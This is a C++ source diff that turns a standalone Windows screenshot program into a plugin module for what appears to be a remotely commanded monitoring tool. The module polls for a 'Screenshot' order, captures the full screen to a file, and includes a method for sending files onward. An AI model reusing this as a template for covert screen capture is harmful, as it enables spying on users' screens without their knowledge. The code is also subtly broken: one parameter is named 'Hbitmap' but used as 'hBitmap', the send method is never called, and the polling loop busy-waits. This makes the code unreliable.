@@ -10,26 +10,47 @@
 
 #include <Windows.h>
 #include <gdiplus.h>
+#include <boost/dll/alias.hpp>
 
 #include "ModuleImage.hpp"
 
-bool GetEncoderClsid(std::string const &format, CLSID* pClsid) {
-    int num = 0;
-    int size = 0;
+ModuleImage::ModuleImage(IModuleCommunication *moduleCommunication)
+        : _moduleCommunication(moduleCommunication) {}
 
-    ImageCodecInfo* pImageCodecInfo = NULL;
+void ModuleImage::start() {
+  IModuleCommunication::Order order;
 
-    GetImageEncodersSize(&num, &size);
+  while (true) {
+    if (this->_moduleCommunication->get("Explorer", order)) {
+      if (order.name == "Screenshot")
+          this->takeScrenshot(L"tmp.bmp");
+    }
+  }
+}
+
+boost::shared_ptr<ModuleImage> ModuleImage::create(IModuleCommunication *moduleCommunication) {
+    return boost::shared_ptr<ModuleImage>(
+            new ModuleImage(moduleCommunication)
+    );
+}
+
+bool ModuleImage::GetEncoderClsid(wchar_t const *format, CLSID* pClsid) {
+    unsigned int num = 0;
+    unsigned int size = 0;
+
+    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
+
+    Gdiplus::GetImageEncodersSize(&num, &size);
     if (size == 0)
         return false;
 
-    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    pImageCodecInfo = (Gdiplus::ImageCodecInfo *)malloc(size);
     if (!pImageCodecInfo)
         return false;
 
     GetImageEncoders(num, size, pImageCodecInfo);
 
-    for (int j = 0; j < num; ++j) {
+    for (unsigned j = 0; j < num; ++j) {
         if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
 	    *pClsid = pImageCodecInfo[j].Clsid;
             ::free(pImageCodecInfo);
@@ -40,7 +61,26 @@ bool GetEncoderClsid(std::string const &format, CLSID* pClsid) {
     return false;
 }
 
-int main() {
+void ModuleImage::sendImage(std::string const *filename) {
+  this->_moduleCommunication->add("Fichier", "send", filename);
+}
+
+void ModuleImage::saveImage(HBITMAP &Hbitmap, std::wstring const &filename) {
+    Gdiplus::GdiplusStartupInput input;
+    ULONG_PTR token;
+
+    Gdiplus::GdiplusStartup(&token, &input, NULL);
+    Gdiplus::Bitmap *image = new Gdiplus::Bitmap(hBitmap, NULL);
+
+    CLSID myClsId;
+    GetEncoderClsid(L"image/bmp", &myClsId);
+    image->Save(filename.c_str(), &myClsId, NULL);
+    delete image;
+
+    Gdiplus::GdiplusShutdown(token);
+}
+
+void ModuleImage::takeScrenshot(std::wstring const &filename) {
     HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
     HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
 
@@ -48,26 +88,15 @@ int main() {
     int height = GetDeviceCaps(hScreenDC, VERTRES);
 
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
-    HBITMAP hOldBitmap = (HBITMAP) SelectObject(hMemoryDC, hBitmap);
+    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
 
     BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
-    hBitmap = (HBITMAP) SelectObject(hMemoryDC, hOldBitmap);
+    hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);
 
     DeleteDC(hMemoryDC);
     DeleteDC(hScreenDC);
 
-    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR Gdiplus::gdiplusToken;
-    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-
-    Bitmap *image = new Bitmap(hBitmap, NULL);
-
-    CLSID myClsId;
-    int retVal = GetEncoderClsid("image/bmp", &myClsId);
-
-    image->Save(L"output.bmp", &myClsId, NULL);
-    delete image;
-
-    Gdiplus::GdiplusShutdown(gdiplusToken);
-    return 0;
+    this->saveImage(hBitmap, filename);
 }
+
+BOOST_DLL_ALIAS(ModuleImage::create, create_module)
